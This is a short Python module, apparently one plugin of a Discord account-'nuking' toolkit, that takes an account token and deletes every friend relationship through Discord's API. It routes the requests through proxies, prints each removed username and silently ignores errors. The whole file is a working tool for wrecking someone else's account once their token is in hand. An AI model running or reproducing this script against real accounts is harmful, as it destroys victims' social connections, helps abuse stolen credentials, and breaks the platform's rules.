import requests

from colorama import Fore

from func.plugins.common import getheaders, proxy

def UnFriender(token, friends):
    for friend in friends:
        try:
            #Delete all friends they have
            requests.delete(
                f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], proxies=proxy(), headers=getheaders(token))
            print(f"{Fore.GREEN}Removed friend: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")